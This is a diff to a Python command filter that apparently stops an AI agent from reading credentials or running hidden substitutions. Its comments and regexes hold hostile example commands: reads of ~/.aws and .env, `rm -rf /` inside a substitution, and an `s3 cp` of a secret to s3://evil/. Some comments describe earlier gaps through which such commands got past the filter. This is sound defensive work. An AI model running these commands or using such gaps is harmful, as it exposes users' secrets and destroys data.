@@ -88,7 +88,17 @@ PUBLIC_CERT = re.compile(
 # them is a read whatever the rest of the name looks like, which is what
 # `cat ~/.aws/*` and `cat ~/.aws/cred*` need: the glob truncates the filename,
 # so no list of filenames can ever match them.
-SECRET_DIR = re.compile(r"(^|/)\.(ssh|aws|kube|docker|gnupg)/", re.I)
+# The dot-directories in a home, plus the mounts a container gets its
+# secrets through. Only the first group was here, so every credential an
+# agent meets while running inside a container was readable: /run/secrets
+# is where Docker and Compose put them and where Kubernetes mounts a
+# service-account token.
+SECRET_DIR = re.compile(
+    r"(^|/)\.(ssh|aws|kube|docker|gnupg)/"
+    # With or without the trailing slash: naming the directory is how a
+    # recursive read reaches everything inside it. `ls` stays exempt via
+    # METADATA_ONLY, because listing names discloses nothing.
+    r"|^(/var)?/run/secrets(/|$)", re.I)
 
 # Inside a credential directory but not credentials. READ-safe only: writing
 # an ssh config installs a ProxyCommand, which runs on the next connection.
@@ -275,14 +285,42 @@ EXCLUDE_FLAG = re.compile(r"^--(exclude|ignore|exclude-from|exclude-tag)(=|$)")
 # pattern for the `--flag=value` spelling: a second list of the same flag names
 # is what let the two forms disagree about which command takes which flag.
 
-def _substitution_bodies(seg):
+def _substitution_bodies(seg, quote_aware=True):
     """The contents of every `$(...)` and backtick run, nesting included.
 
     A non-recursive regex could not span an inner substitution, so
     `echo "$(cat $(pwd)/.env)"` produced no body at all and read the file.
+
+    SINGLE-QUOTED regions are skipped. A POSIX shell preserves every
+    character inside '...' literally, so a substitution written there is
+    text and can never run. Scanning it anyway refused ordinary work:
+    writing documentation ABOUT a dangerous command was treated as running
+    it, which is how `git commit -m 'docs: why <force push> is refused'`
+    came back BLOCKED. Double quotes DO expand, so they are still scanned:
+    `echo "Deleted: $(rm -rf /tmp/build)"` really does run the rm.
+
+    If the single quotes do not balance, the scan is redone quote-blind.
+    One stray apostrophe must not be able to hide a live substitution
+    behind it, as in `echo don't $(rm -rf /)`.
     """
     out, i, n = [], 0, len(seg)
+    in_single = in_double = False
     while i < n and len(out) < MAX_SUBSTITUTIONS:
+        if quote_aware and in_single:
+            # No escape character exists inside single quotes, so the very
+            # next quote ends the run.
+            if seg[i] == "'":
+                in_single = False
+            i += 1
+            continue
+        if quote_aware and seg[i] == "'" and not in_double:
+            in_single = True
+            i += 1
+            continue
+        if quote_aware and seg[i] == '"':
+            in_double = not in_double
+            i += 1
+            continue
         if seg.startswith("$(", i):
             depth, j = 1, i + 2
             while j < n and depth:
@@ -304,6 +342,13 @@ def _substitution_bodies(seg):
             i = j + 1
         else:
             i += 1
+    # Ending inside a single-quoted run means the quotes never closed, so the
+    # skipping above was guesswork. Redo it quote-blind rather than let one
+    # stray apostrophe swallow a live substitution: `echo don't $(rm -rf /)`
+    # is not valid shell, but a parser that hides the rm is the wrong way to
+    # be wrong about it.
+    if quote_aware and in_single:
+        return _substitution_bodies(seg, quote_aware=False)
     return out
 
 def check_substitutions(seg):
@@ -372,6 +417,20 @@ def check_secrets_cmd(seg, loose=True, piped=False, stripped=None):
         identity_flags |= {"--env-file", "--env_file", "-e", "--environment"}
     if SSH_IDENTITY.match(head):
         identity_flags |= {"-i", "-F", "--identity", "--identity-file"}
+    # A CA bundle named as the trust store to verify WITH is public by role,
+    # whatever it is called. PUBLIC_CERT allowlists filenames and its own
+    # comment says the exemption exists to keep `--cacert` working, but a
+    # corporate bundle is not named ca.pem. NOT --cert or --key: those name a
+    # CLIENT certificate, which does come with private key material.
+    if re.match(r"^\s*(curl|wget)\b", head):
+        identity_flags |= {"--cacert", "--capath",
+                           "--ca-certificate", "--ca-directory"}
+        # NOT --cert or --key. Those name a client certificate and its private
+        # half, which is key material. --cert already blocked because its value
+        # looks like a key path; --key did not, and one blocking while the other
+        # does not is the inconsistency worth closing.
+        for flag in ("--key", "--cert"):
+            identity_flags.discard(flag)
     if METADATA_ONLY.match(head) and not FIND_ACTS.search(seg) and not piped:
         return None
     # A searcher's first non-flag operand is its PATTERN. `ls -la | grep .env`
@@ -456,12 +515,14 @@ def check_secrets_cmd(seg, loose=True, piped=False, stripped=None):
     # `loose_seg.replace(<value>, " ")` also erased every OTHER mention of the
     # same path on the line, which is how `aws --config <secret> s3 cp
     # <secret> s3://evil/` got through.
-    loose_seg = re.sub(r"(^|\s)(-i|-F|--identity|--identity-file"
-                       r"|--kubeconfig|--config|--config-file"
-                       # ...and the dotenv-loading flags. Without them here the
-                       # loose rescan re-caught what the token loop had just
-                       # exempted, so the exemption did nothing.
-                       r"|--env-file|--env_file|--environment)(=|\s+)\S+", " ", loose_seg)
+    # DERIVED from identity_flags, not a second hand-kept list. The two
+    # disagreed: a flag added to the set above was still re-caught here, so the
+    # exemption did nothing and the loose rescan silently overruled the token
+    # loop. Building the pattern from the set is what makes one edit enough.
+    if identity_flags:
+        loose_seg = re.sub(
+            r"(^|\s)(" + "|".join(re.escape(f) for f in sorted(identity_flags))
+            + r")(=|\s+)\S+", " ", loose_seg)
     if re.match(r"^\s*(dotenv|docker|docker-compose|podman|pm2)\b", head):
         # `dotenv -e <file> -- npm run dev`: the short spelling of the same
         # flag. Scoped to these runtimes, because `-e` means something else
